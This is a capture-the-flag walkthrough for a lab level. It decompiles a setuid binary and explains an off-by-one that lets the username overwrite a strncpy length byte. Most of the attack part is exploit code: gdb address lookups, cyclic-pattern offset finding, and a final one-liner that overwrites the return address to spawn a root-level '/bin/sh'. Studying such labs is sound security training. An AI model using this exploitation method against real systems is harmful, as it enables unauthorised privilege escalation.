# Walkthrough

Finally! A binary with `PIE`! It's good to see at least one in all the branch.

```c
int main(void)
{
    puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n- -------------------------------------------");
    handle_msg();
    return 0;
}
```

Simple `main`, let's check the other functions:
```c
void handle_msg(void)
{
    char buff [184];

    buff[140] = '\0';
    buff[141] = '\0';
    buff[142] = '\0';
    buff[143] = '\0';
    buff[144] = '\0';
    buff[145] = '\0';
    buff[146] = '\0';
    buff[147] = '\0';
    buff[148] = '\0';
    buff[149] = '\0';
    buff[150] = '\0';
    buff[151] = '\0';
    buff[152] = '\0';
    buff[153] = '\0';
    buff[154] = '\0';
    buff[155] = '\0';
    buff[156] = '\0';
    buff[157] = '\0';
    buff[158] = '\0';
    buff[159] = '\0';
    buff[160] = '\0';
    buff[161] = '\0';
    buff[162] = '\0';
    buff[163] = '\0';
    buff[164] = '\0';
    buff[165] = '\0';
    buff[166] = '\0';
    buff[167] = '\0';
    buff[168] = '\0';
    buff[169] = '\0';
    buff[170] = '\0';
    buff[171] = '\0';
    buff[172] = '\0';
    buff[173] = '\0';
    buff[174] = '\0';
    buff[175] = '\0';
    buff[176] = '\0';
    buff[177] = '\0';
    buff[178] = '\0';
    buff[179] = '\0';
    buff[180] = 0x8c; // We'll talk about this later
    buff[181] = '\0';
    buff[182] = '\0';
    buff[183] = '\0';
    set_username(buff);
    set_msg(buff);
    puts(">: Msg sent!");
    return;
}

void set_username(char *param_1)
{
    long lVar1;
    undefined8 *puVar2;
    undefined8 local_98 [17];
    int local_c;

    puVar2 = local_98;
    for (lVar1 = 0x10; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
    }
    puts(">: Enter your username");
    printf(">>: ");
    fgets((char *)local_98,128,_stdin);
    for (local_c = 0; (local_c < 0x29 && (*(char *)((long)local_98 + (long)local_c) != '\0'));
            local_c = local_c + 1) {
        param_1[(long)local_c + 0x8c] = *(char *)((long)local_98 + (long)local_c);
    }
    printf(">: Welcome, %s",param_1 + 0x8c);
    return;
}

void set_msg(char *param_1)

{
    long lVar1;
    undefined8 *puVar2;
    undefined8 local_408 [128];

    puVar2 = local_408;
    for (lVar1 = 128; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
    }
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets((char *)local_408,0x400,_stdin);
    strncpy(param_1,(char *)local_408,(long)*(int *)(param_1 + 0xb4));
    return;
}
```

And we also have this function that seems sus:
```c
void secret_backdoor(void)
{
    char local_88 [128];

    fgets(local_88,128,_stdin);
    system(local_88);
    return;
}
```

We have a buffer of `184` bytes/chars, the first thing the program does is
calling `set_username`, this function has an internal buffer of `136` bytes,
which uses in a `fget`, but the read size is `128`, so it's not vulnerable.

Then it copies `41` bytes to our `buff`, starting at `buff[140]`, and prints
`&buff[140]`.

Then it calls `set_msg`, which has a buffer of `1024` bytes, and the `fget` reads
`1024`, wow, that's a big buffer!

Then it does an strange `strncpy`, it copies to `buff`, from the local buffer
of `128` bytes, but, it copies `buff[180]` bytes?! Now it makes sense that line
in `handle_msg`...

```c
buff[180] = 0x8c; // We'll talk about this later
buff[181] = '\0';
buff[182] = '\0';
buff[183] = '\0';
```

This four bytes as treated as integers, and that would be (little-endian) the
integer: `\x00\x00\x00\x8c` == `140`. So, it will copy `140` bytes.

We can assume the `char[184]` buffer is used as follows:
- `140` bytes for the message.
- `40` bytes for the username.
- `4` bytes for an integer, which is the size of an `strncpy`.

But, in `set_username`, it was copying `41` bytes to `buff + 140`... That means
we have access to the low byte of the integer, so we have control over the size
of the `strncpy`, we can play with it and copy between `0x00` and `0xFF` bytes!

## Explotation

The hard part will be dealing with the `PIE`, we can checkc that is enable just
by running `file`:
```bash
$ file ./level09
./level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

That `shared object` means that is indeed compiled with `PIE`, if not it would
say just `executable`.

But, `PIE` is nothing without `ASLR`, so if `ASLR` is turned off, even `PIE`
binaries will load always at the same address (althought we'll need to check
that addresss).

We can check `ASLR` in linux doing:
```bash
# 0 == off, 1 == on
cat /proc/sys/kernel/randomize_va_space
0
```

So, it's off, let's just open gdb and get the address of the `secret_backdoor`
function, we will need to run the binary at least once so it gets loaded,
and then we can check the base address:
```bash
# Notice that before running all the addresses will be less than 0x1000
# This is because pages are the things being randomised in memory,j
# which have a standard size of 0x1000
(gdb) p/x &secret_backdoor
$5 = 0x88c

# Run and get the address after
(gdb) r
# ... make it end ...
(gdb) p/x &secret_backdoor
$6 = 0x55555555488c
```

That's the `secret_backdoor` address, cool.

Now let's start with the actual explotation, we will force that second `strncpy`
to copy __a lot__ of bytes, so for that we need a username of 41 character,
so the last one gets copied into `buff[180]`.

And for the message, let's just send a pattern to calculate the offset:
```bash
# Payload without pattern so it's readable
# python -c "print 'A' * 40 + '\xFF' + '\n' + 'PATTERN' + '\n'" > /tmp/payload
python -c "print 'A' * 40 + '\xFF' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' + '\n'" > /tmp/payload

gdb -q ./level09

r < /tmp/payload

# Output
Program received signal SIGSEGV, Segmentation fault.
0x000000000000000a in ?? ()
# Registers
info registers
rbp            0x6741356741346741	0x6741356741346741
```

The `rbp` has something, `8` bytes that are at offset `192`, and our pattern
was only `200` bytes long, we will need a bigger pattern to reach `RIP`:

```bash
python -c "print 'A' * 40 + '\xFF' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A' + '\n'" > /tmp/payload

gdb -q ./level09

# Output
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()

# Print rsp (g == 64 bits, for 32 bits use a word -> w == 32 bits)
# Although for a pattern 32 bits also do the work, we don't need more
(gdb) x/gx $rsp
0x7fffffffe598: 0x4138674137674136
```

That's an offset of `200` to `rsp`. But why the part of the pattern that
overwrote the return address will be on the `rsp`?

The value or `rsp` is not used to calculate the return address offset, it's
used to identify the current location on the stack, which can be useful to
determine the offset necessary for overwriting `rip`.

This happens because when a function ends, local variables and other data gets
dumped, and the `rsp` goes down to the return address, to pop it into the
`rip`, and resume execution where it was left.

So, we have the offset, and the `secret_backdoor` function address, so let's
just write a payload, in a python one liner, of course:
```bash
cat <(python -c "print 'A' * 40 + '\xd0' + '\n' + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + '/bin/sh' + '\n'") - | ./level09
```

Note how I adjust the byte that tells `strncpy` the size to copy,
so it does not segfault trying to copy more bytes that the one there actually
are!

I adjust it to `200` offset bytes + `8` bytes of the address: `\xd0`.

Also, notice I added a `"/bin/sh"` at the end, that's because the
`secret_backdoor` function asks for the input of `system()`, so we needed
that input.

So, remember the last user is `end`, and go get the flag!
